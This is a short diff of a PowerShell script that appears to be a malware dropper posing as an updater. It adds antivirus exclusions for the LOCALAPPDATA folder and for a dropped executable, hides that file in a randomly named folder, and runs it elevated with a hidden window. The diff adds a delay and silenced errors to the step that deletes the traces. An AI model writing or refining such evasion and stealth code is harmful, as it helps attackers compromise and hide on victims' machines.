@@ -24,7 +24,6 @@ Add-Exclusion -Path $env:LOCALAPPDATA
 
 $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
 New-Item -ItemType $directory -Path $hiddenFolder -Force | Out-Null
-
 $tempPath = Join-Path $hiddenFolder $updaterExe
 
 try {
@@ -33,7 +32,8 @@ try {
     (Get-Item $tempPath).Attributes += 'Hidden'
     Add-Exclusion -Path $tempPath
     Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -Wait
-    Remove-Item $hiddenFolder -Recurse -Force
+    Start-Sleep -Seconds 5
+    Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue
 }
 catch {
     exit 1
